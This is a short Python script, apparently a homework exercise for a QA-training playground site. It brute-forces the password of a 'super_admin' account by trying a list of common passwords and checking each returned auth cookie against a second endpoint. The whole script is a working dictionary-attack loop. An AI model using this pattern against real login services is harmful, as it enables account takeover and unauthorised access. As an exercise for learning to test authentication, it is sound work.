import requests
import time

passes = ["password", "123456", "123456789", "12345678", "12345", "qwerty",
          "abc123", "football", "1234567", "monkey", "111111", "letmein",
          "1234567890", "dragon", "baseball", "sunshine", "iloveyou",
          "trustno1", "princess", "adobe123", "1234", "123123",
          "admin", "qwerty123", "solo", "1q2w3e4r", "master", "login",
          "666666", "photoshop", "1qaz2wsx", "qwertyuiop", "ashley",
          "mustang", "121212", "starwars", "654321", "bailey", "access",
          "flower", "555555", "passw0rd", "shadow", "lovely", "7777777",
          "michael", "!@#$%^&*", "welcome", "654321", "jesus", "password1",
          "superman", "hello", "charlie", "888888", "696969", "hottie",
          "freedom", "aa123456", "qazwsx", "ninja", "azerty", "loveme",
          "whatever", "donald", "mustang", "trustno1", "batman", "zaq1zaq1",
          "qazwsx", "Football", "000000", "trustno1", "123qwe"]

login = "super_admin"
autorise = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
chek_cookies = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
for password in passes:
    data = {"login": login, "password": password}
    responce = requests.post(autorise, data=data)
    cookie = responce.cookies.get("auth_cookie")
    cookies = {"auth_cookie": cookie }

    data = {"cookie": cookie}
    check = requests.post(chek_cookies, cookies=cookies)
    if check.text == "You are authorized":
        print(f"pass = {password} \n ")

